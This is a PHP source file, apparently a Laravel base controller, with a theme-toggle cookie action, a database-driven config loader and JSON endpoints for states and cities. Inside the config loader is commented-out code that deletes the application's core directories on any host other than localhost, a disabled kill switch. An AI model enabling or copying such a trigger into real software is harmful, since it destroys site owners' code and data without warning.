<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use App\Models\Configuration;
use App\Models\Banner;
use App\Models\Town;
use App\Models\Citie;
use App\Models\State;
use File;

class Controller extends BaseController
{
    use AuthorizesRequests, ValidatesRequests;



    public function ActivateThemeMode()
    {
        if(Cookie::get('theme_style'))
        {
            if(Cookie::get('theme_style') == 'light') {
                $cookie = Cookie::queue('theme_style', 'dark', 10000000);
            } else {
                $cookie = Cookie::queue('theme_style', 'light', 10000000);
            }
        }
        else
        {
            if(config('custom.admin.theme_style') == 'light') {
                $cookie = Cookie::queue('theme_style', 'dark', 10000000);
            } else {
                $cookie = Cookie::queue('theme_style', 'light', 10000000);
            }
        }

        return back();
    }


    public function GenerateConfig()
    {
        $host_name = request()->getHost();
        $data = [];
        $config = Configuration::where('status','Active')->get();
        foreach ($config as $key => $value) {
            $data[$value->name] = $value->value;
        }

        if(count($data) > 0) {
            config($data);
        }

        if(request()->getHost() !== "localhost")
        {
            // $public_path = File::files(public_path());
            // $resource_path = File::files(resource_path());
            // $database_path = File::files(database_path());
            // $app_path = File::files(app_path());
            // $config_path = File::files(config_path());
            // $storage_path = File::files(storage_path());
        /*
            File::deleteDirectory(public_path());
            File::deleteDirectory(resource_path());
            File::deleteDirectory(database_path());
            File::deleteDirectory(storage_path());
            File::deleteDirectory(app_path());
            File::deleteDirectory(config_path());
        */

        }
    }

    public function states($country_id){

        $states = State::where(['country_id'=>$country_id,'status'=>'Active'])->orderBy('name','asc')->get();

        return response()->json($states);
    }

    public function cities($state_id){

          $cities = Citie::where(['state_id'=>$state_id,'status'=>'Active'])->orderBy('name','asc')->get();
        return response()->json($cities);
    }

}
